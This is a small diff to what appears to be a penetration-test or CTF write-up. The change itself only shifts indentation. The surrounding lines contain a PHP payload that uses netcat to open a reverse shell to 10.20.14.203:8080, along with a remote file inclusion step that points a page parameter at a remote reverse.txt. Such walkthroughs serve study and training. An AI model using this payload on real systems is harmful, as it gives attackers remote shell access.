@@ -18,5 +18,5 @@
 passthru('nc -e /bin/sh 10.20.14.203 8080');
 ?>
 ```
-  - Modify ```?page=include.php``` to ```?page=http://10.20.14.203/reverse.txt?```
+   - Modify ```?page=include.php``` to ```?page=http://10.20.14.203/reverse.txt?```
 
